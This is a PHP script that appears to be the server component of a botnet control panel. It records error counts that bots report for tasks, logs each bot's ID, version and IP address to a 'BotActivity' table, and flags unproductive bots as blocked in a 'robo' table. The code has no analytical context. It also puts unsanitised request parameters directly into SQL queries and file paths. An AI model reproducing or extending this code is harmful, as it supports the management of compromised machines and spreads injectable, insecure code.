<?
  require("cfg.php");

  function index_inc($file,$count) {
    $f = fopen($file,"a+");
    if (!$f) return -1;
    flock($f,2);
    $c = fread($f,100);
    $cc = $c + $count;
    ftruncate($f,0);
    fwrite($f,$cc);
    flock($f,3);
    fclose($f);
    return $c;
  }
  
  $errors_dir = "./errors/";
  
  $task = $_GET['task'];
  $errors = $_GET['errors'];
  $ver = $_GET['ver'];
  $id = $_GET['id'];
  
  $good_count = 0;
  
  
  foreach ($errors as $err => $err_count)
  {          
     index_inc("$errors_dir$task.$err",$err_count);
     
     if ($err == 0)
     {     
       $good_count = $err_count;
     }     
  }
  
  
  $fs = @fopen("block.dat", "rb");
  if ($fs)
  {      
    $bl_fg = fread($fs, 1);
    fclose($fs);
  }
  else $bl_fg = 0;
  
  
  if ($bl_fg == '1')    
  {
     
     if ($good_count == 0)
     {     
        echo "BLOCk";
        
        require("cfg.php");
        $id=$_GET['id'];
        @mysql_query("UPDATE robo SET `bl` = '1' WHERE `id` = '$id';");     
     }
  }

  $ip = $_SERVER['REMOTE_ADDR'];
  if ($log_activity)
      @mysql_query("INSERT INTO BotActivity (DateTime,BotId,BotVer,ActivityType,AdditionalId,IP) VALUES ('".date("Y-m-d H:i:s")."','$id','$ver','3','$good_count','$ip');");
  mysql_close($dbase);  
?>
